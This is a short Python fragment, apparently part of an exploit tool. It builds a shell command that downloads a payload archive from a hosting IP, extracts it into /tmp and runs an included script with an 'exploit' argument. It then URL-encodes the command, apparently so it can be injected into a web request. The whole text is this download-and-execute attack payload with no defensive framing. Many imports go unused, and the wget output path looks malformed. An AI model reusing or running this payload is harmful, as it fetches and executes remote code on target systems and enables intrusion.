from concurrent.futures import thread
import os
import shutil
import tarfile
import requests
import sys
import re
import time
import random
import hashlib
import platform
import socket
import urllib.parse
hosting_ip = "192.168.31.2"
exploit_cmd = "wget http://{}/build/payload.tar.gz -O /tmp/ && tar -xzf /tmp/payload.tar.gz && sh /tmp/script.sh exploit".format(hosting_ip)
print("exploit cmd: {}".format(exploit_cmd))
exploit_code = urllib.parse.quote(exploit_cmd, '')
print("exploit_code: {}".format(exploit_code))